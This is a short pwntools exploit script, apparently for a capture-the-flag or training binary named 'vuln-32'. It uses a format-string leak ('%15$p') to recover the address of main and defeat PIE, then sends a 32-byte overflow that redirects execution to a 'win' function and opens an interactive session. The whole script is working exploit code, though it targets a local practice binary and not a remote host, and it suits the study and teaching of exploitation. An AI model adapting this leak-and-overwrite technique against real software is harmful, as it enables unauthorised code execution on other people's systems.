from pwn import *

elf = context.binary = ELF("./vuln-32")


offset = 15


p = process()
p.recvline()
p.sendline(f"%{offset}$p")

p.recvuntil("you ")
leaked_main = int(p.recvline().decode().strip(),16)
elf.address = leaked_main - elf.sym["main"] - 21



payload = flat([
    b"A" * 32,
    elf.sym["win"] 
])
print(hex(leaked_main))
# gdb.attach(p)
p.sendline(payload)
p.interactive()